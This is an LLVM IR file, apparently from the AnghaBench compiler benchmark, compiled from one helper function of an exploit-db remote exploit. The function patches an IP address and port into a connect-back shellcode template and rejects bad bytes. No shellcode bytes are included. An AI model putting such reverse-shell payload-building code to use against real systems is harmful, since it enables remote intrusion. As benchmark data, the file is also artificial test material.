; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_21297.c_make_connback_shellcode.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_21297.c_make_connback_shellcode.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [21 x i8] c"[-] Out of memory !\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [29 x i8] c"[*] Using ip=0x%.8x port=%d\0A\00", align 1
@.str.2 = private unnamed_addr constant [99 x i8] c"[-] Ip contains invalid byte(s) that can't be in the shellcode\0A[-] Change ip/shellcode and retry.\0A\00", align 1
@.str.3 = private unnamed_addr constant [107 x i8] c"[-] Port contains invalid byte(s) that can't be in the shellcode\0A[-] Change bindport/shellcode and retry.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @make_connback_shellcode(i8* %0, i64 %1, i16 zeroext %2, i32 %3, i32 %4) #0 {
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i16, align 2
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8, align 1
  %12 = alloca i8, align 1
  %13 = alloca i8, align 1
  %14 = alloca i8, align 1
  %15 = alloca i8*, align 8
  store i8* %0, i8** %6, align 8
  store i64 %1, i64* %7, align 8
  store i16 %2, i16* %8, align 2
  store i32 %3, i32* %9, align 4
  store i32 %4, i32* %10, align 4
  %16 = load i8*, i8** %6, align 8
  %17 = call i64 @strdup(i8* %16)
  %18 = inttoptr i64 %17 to i8*
  store i8* %18, i8** %15, align 8
  %19 = load i32, i32* @stderr, align 4
  %20 = call i32 @fflush(i32 %19)
  %21 = load i8*, i8** %15, align 8
  %22 = icmp ne i8* %21, null
  br i1 %22, label %28, label %23

23:                                               ; preds = %5
  %24 = load i32, i32* @stderr, align 4
  %25 = call i32 @fprintf(i32 %24, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i64 0, i64 0))
  %26 = load i32, i32* @EXIT_FAILURE, align 4
  %27 = call i32 @exit(i32 %26) #3
  unreachable

28:                                               ; preds = %5
  %29 = load i64, i64* %7, align 8
  %30 = trunc i64 %29 to i32
  %31 = load i16, i16* %8, align 2
  %32 = call i32 @debug(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0), i32 %30, i16 zeroext %31)
  %33 = load i8, i8* %11, align 1
  %34 = load i8, i8* %12, align 1
  %35 = load i8, i8* %13, align 1
  %36 = load i8, i8* %14, align 1
  %37 = load i64, i64* %7, align 8
  %38 = call i32 @OCT(i8 signext %33, i8 signext %34, i8 signext %35, i8 signext %36, i64 %37)
  %39 = load i8, i8* %11, align 1
  %40 = icmp ne i8 %39, 0
  br i1 %40, label %41, label %82

41:                                               ; preds = %28
  %42 = load i8, i8* %12, align 1
  %43 = icmp ne i8 %42, 0
  br i1 %43, label %44, label %82

44:                                               ; preds = %41
  %45 = load i8, i8* %13, align 1
  %46 = icmp ne i8 %45, 0
  br i1 %46, label %47, label %82

47:                                               ; preds = %44
  %48 = load i8, i8* %14, align 1
  %49 = icmp ne i8 %48, 0
  br i1 %49, label %50, label %82

50:                                               ; preds = %47
  %51 = load i8, i8* %11, align 1
  %52 = sext i8 %51 to i32
  %53 = icmp eq i32 %52, 10
  br i1 %53, label %82, label %54

54:                                               ; preds = %50
  %55 = load i8, i8* %12, align 1
  %56 = sext i8 %55 to i32
  %57 = icmp eq i32 %56, 10
  br i1 %57, label %82, label %58

58:                                               ; preds = %54
  %59 = load i8, i8* %13, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 10
  br i1 %61, label %82, label %62

62:                                               ; preds = %58
  %63 = load i8, i8* %14, align 1
  %64 = sext i8 %63 to i32
  %65 = icmp eq i32 %64, 10
  br i1 %65, label %82, label %66

66:                                               ; preds = %62
  %67 = load i8, i8* %11, align 1
  %68 = sext i8 %67 to i32
  %69 = icmp eq i32 %68, 13
  br i1 %69, label %82, label %70

70:                                               ; preds = %66
  %71 = load i8, i8* %12, align 1
  %72 = sext i8 %71 to i32
  %73 = icmp eq i32 %72, 13
  br i1 %73, label %82, label %74

74:                                               ; preds = %70
  %75 = load i8, i8* %13, align 1
  %76 = sext i8 %75 to i32
  %77 = icmp eq i32 %76, 13
  br i1 %77, label %82, label %78

78:                                               ; preds = %74
  %79 = load i8, i8* %14, align 1
  %80 = sext i8 %79 to i32
  %81 = icmp eq i32 %80, 13
  br i1 %81, label %82, label %87

82:                                               ; preds = %78, %74, %70, %66, %62, %58, %54, %50, %47, %44, %41, %28
  %83 = load i32, i32* @stderr, align 4
  %84 = call i32 @fprintf(i32 %83, i8* getelementptr inbounds ([99 x i8], [99 x i8]* @.str.2, i64 0, i64 0))
  %85 = load i32, i32* @EXIT_FAILURE, align 4
  %86 = call i32 @exit(i32 %85) #3
  unreachable

87:                                               ; preds = %78
  %88 = load i16, i16* %8, align 2
  %89 = zext i16 %88 to i32
  %90 = and i32 %89, 255
  %91 = icmp ne i32 %90, 0
  br i1 %91, label %92, label %117

92:                                               ; preds = %87
  %93 = load i16, i16* %8, align 2
  %94 = zext i16 %93 to i32
  %95 = and i32 %94, 65280
  %96 = icmp ne i32 %95, 0
  br i1 %96, label %97, label %117

97:                                               ; preds = %92
  %98 = load i16, i16* %8, align 2
  %99 = zext i16 %98 to i32
  %100 = and i32 %99, 255
  %101 = icmp eq i32 %100, 10
  br i1 %101, label %117, label %102

102:                                              ; preds = %97
  %103 = load i16, i16* %8, align 2
  %104 = zext i16 %103 to i32
  %105 = and i32 %104, 65280
  %106 = icmp eq i32 %105, 10
  br i1 %106, label %117, label %107

107:                                              ; preds = %102
  %108 = load i16, i16* %8, align 2
  %109 = zext i16 %108 to i32
  %110 = and i32 %109, 255
  %111 = icmp eq i32 %110, 13
  br i1 %111, label %117, label %112

112:                                              ; preds = %107
  %113 = load i16, i16* %8, align 2
  %114 = zext i16 %113 to i32
  %115 = and i32 %114, 65280
  %116 = icmp eq i32 %115, 13
  br i1 %116, label %117, label %122

117:                                              ; preds = %112, %107, %102, %97, %92, %87
  %118 = load i32, i32* @stderr, align 4
  %119 = call i32 @fprintf(i32 %118, i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.3, i64 0, i64 0))
  %120 = load i32, i32* @EXIT_FAILURE, align 4
  %121 = call i32 @exit(i32 %120) #3
  unreachable

122:                                              ; preds = %112
  %123 = load i64, i64* %7, align 8
  %124 = call i64 @htonl(i64 %123)
  %125 = load i8*, i8** %15, align 8
  %126 = load i32, i32* %9, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8, i8* %125, i64 %127
  %129 = bitcast i8* %128 to i64*
  store i64 %124, i64* %129, align 8
  %130 = load i16, i16* %8, align 2
  %131 = call zeroext i16 @htons(i16 zeroext %130)
  %132 = load i8*, i8** %15, align 8
  %133 = load i32, i32* %10, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds i8, i8* %132, i64 %134
  %136 = bitcast i8* %135 to i16*
  store i16 %131, i16* %136, align 2
  %137 = load i8*, i8** %15, align 8
  ret i8* %137
}

declare dso_local i64 @strdup(i8*) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @fprintf(i32, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @debug(i8*, i32, i16 zeroext) #1

declare dso_local i32 @OCT(i8 signext, i8 signext, i8 signext, i8 signext, i64) #1

declare dso_local i64 @htonl(i64) #1

declare dso_local zeroext i16 @htons(i16 zeroext) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
